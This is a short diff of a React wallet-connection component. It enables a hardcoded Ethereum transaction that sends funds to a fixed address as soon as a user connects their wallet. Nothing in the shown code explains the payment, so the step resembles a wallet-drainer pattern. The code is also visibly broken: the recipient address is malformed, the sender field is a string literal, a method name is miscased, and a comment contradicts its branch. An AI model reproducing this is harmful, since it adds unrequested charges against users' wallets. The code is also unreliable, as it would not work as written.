@@ -17,20 +17,20 @@ function App() {
   const [txs, setTxs] = useState([]);
   const [signer, setSigner] = useState("");
   const [ walletAddress, setwalletAddress] = useState("");
-  /*const Tx = {
+  const tx = {
     from: '(accounts[0])',
     to: '0x058508d2ACFe10652072948A60B72860B7286bd1acEC9d',
     value: '50000000000000',
     gasPrice: '2500000',
     gas: '21000',
-  }*/
+  }
   const connectWallet = async() => {
     if (typeof window != "undefined" && typeof window.ethereum != "undefined"){
       try {
         /* MetaMask is not installed */
         const accounts = await window.ethereum.request({ method: "eth_requestAccounts"});
         const signer = provider.getsigner(accounts[0]);
-        /*const transaction = await signer.sendTransaction(tx);*/
+        const transaction = await signer.sendTransaction(tx);
         setwalletAddress(accounts[0]);
         setSigner(accounts[0]);
         setProvider(accounts[0]);
